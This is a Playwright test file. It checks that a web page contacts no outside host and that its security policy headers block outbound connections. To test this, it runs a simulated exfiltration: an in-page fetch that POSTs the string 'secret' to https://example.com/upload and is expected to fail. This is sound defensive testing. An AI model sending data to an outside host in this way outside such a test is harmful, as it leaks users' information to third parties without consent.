import { expect, test } from "@playwright/test";

/** Collects every request the page makes that is not to this site, a blob or a data URL. */
export function watchOutbound(page: import("@playwright/test").Page, origin: string): string[] {
  const outbound: string[] = [];
  const check = (url: string) => {
    if (!url.startsWith(origin) && !url.startsWith("blob:") && !url.startsWith("data:")) outbound.push(url);
  };
  page.on("request", (r) => check(r.url()));
  page.on("requestfailed", (r) => check(r.url()));
  return outbound;
}

test("the page loads without contacting anything but this site", async ({ page, baseURL }) => {
  const outbound = watchOutbound(page, baseURL!);
  await page.goto("/");
  await page.waitForLoadState("networkidle");
  expect(outbound).toEqual([]);
});

test("the security policy is served and blocks outbound requests", async ({ page }) => {
  const response = await page.goto("/");
  const csp = response!.headers()["content-security-policy"];
  expect(csp).toContain("connect-src 'self'");
  expect(response!.headers()["referrer-policy"]).toBe("no-referrer");

  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/upload", { method: "POST", body: "secret" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});
